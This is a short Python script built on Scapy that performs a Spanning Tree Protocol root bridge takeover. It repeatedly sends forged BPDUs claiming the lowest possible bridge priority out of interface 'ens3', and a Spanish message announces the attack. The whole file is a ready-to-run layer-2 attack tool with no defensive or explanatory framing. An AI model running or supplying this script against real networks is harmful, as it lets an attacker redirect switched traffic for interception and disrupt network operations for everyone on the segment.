from scapy.all import *
from scapy.layers.l2 import STP

def stp_root_attack(iface_name):
    print(f"Lanzando ataque STP Root Bridge en {iface_name}...")

    pkt = Dot3(dst="01:80:c2:00:00:00") / \
          STP(rootid=0, rootmac="00:00:00:00:00:01",
              bridgeid=0, bridgemac="00:00:00:00:00:01",
              portid=0x8001, pathcost=0)

    sendp(pkt, iface=iface_name, inter=2, loop=1, verbose=1)

if __name__ == "__main__":
    stp_root_attack("ens3")
